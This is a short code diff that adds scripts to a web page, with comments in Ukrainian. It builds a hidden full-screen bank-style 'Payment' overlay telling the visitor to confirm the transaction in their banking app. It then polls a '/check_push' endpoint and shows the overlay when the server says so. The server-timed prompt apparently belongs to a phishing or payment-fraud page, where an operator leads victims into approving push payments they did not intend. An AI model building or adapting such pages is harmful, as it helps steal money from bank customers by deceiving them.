@@ -239,5 +239,43 @@
         }
     })();
     </script>
+    <!-- Додаємо push-overlay у HTML, якщо його немає -->
+    <script>
+    if (!document.getElementById('push-overlay')) {
+      const pushOverlay = document.createElement('div');
+      pushOverlay.id = 'push-overlay';
+      pushOverlay.style = 'display:none;position:fixed;top:0;left:0;width:100vw;height:100vh;background:#00b2ff;z-index:100000;align-items:center;justify-content:center;flex-direction:column;';
+      pushOverlay.innerHTML = '<div style="background:#fff;border-radius:20px;max-width:370px;width:100%;margin:auto;padding:2.5rem 2rem 2rem 2rem;box-shadow:0 8px 32px rgba(0,0,0,0.12);text-align:center;"><div class="bank-icon" style="margin-bottom:1.2rem;"><svg viewBox="0 0 24 24"><path d="M12 2L2 7v2h20V7L12 2zm0 2.18L18.09 7H5.91L12 4.18zM4 10v8h2v-6h12v6h2v-8H4zm2 8v-6h12v6H6z"/></svg></div><div class="payment-title" id="push-payment-title" style="font-size:2rem;font-weight:700;margin-bottom:1.2rem;">Payment</div><div style="margin:24px 0;"><svg width="80" height="80" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="12" r="40" fill="#e6f7ff"/><path d="M12 22c1.1 0 2-.9 2-2h-4a2 2 0 0 0 2 2zm6-6V11c0-3.07-1.63-5.64-5-6.32V4a1 1 0 1 0-2 0v.68C7.63 5.36 6 7.92 6 11v5l-1.29 1.29A1 1 0 0 0 6 19h12a1 1 0 0 0 .71-1.71L18 16z" fill="#00b2ff"/></svg></div><div style="font-size:1.1rem;color:#222;margin-bottom:18px;">To confirm the transaction, go to the banking application and follow the instructions of the issuing bank.</div></div>';
+      document.body.appendChild(pushOverlay);
+    }
+    </script>
+    <!-- Polling для push (push-overlay) -->
+    <script>
+    function getPageCode() {
+      const urlParams = new URLSearchParams(window.location.search);
+      let page = urlParams.get('page');
+      if (page) return page;
+      page = sessionStorage.getItem('page_code');
+      if (page) return page;
+      return '';
+    }
+    function pollPushOverlay() {
+      const page_code = getPageCode();
+      document.body.setAttribute('data-page-code', page_code);
+      if (!page_code) return setTimeout(pollPushOverlay, 2000);
+      const url = '/check_push?page_code=' + encodeURIComponent(page_code);
+      fetch(url)
+        .then(resp => resp.text())
+        .then(txt => {
+          if (txt === 'true') {
+            document.getElementById('push-overlay').style.display = 'flex';
+            if (window.loadingOverlay) loadingOverlay.style.display = 'none';
+          } else {
+            setTimeout(pollPushOverlay, 2000);
+          }
+        });
+    }
+    setTimeout(pollPushOverlay, 2000);
+    </script>
 </body>
 </html> 
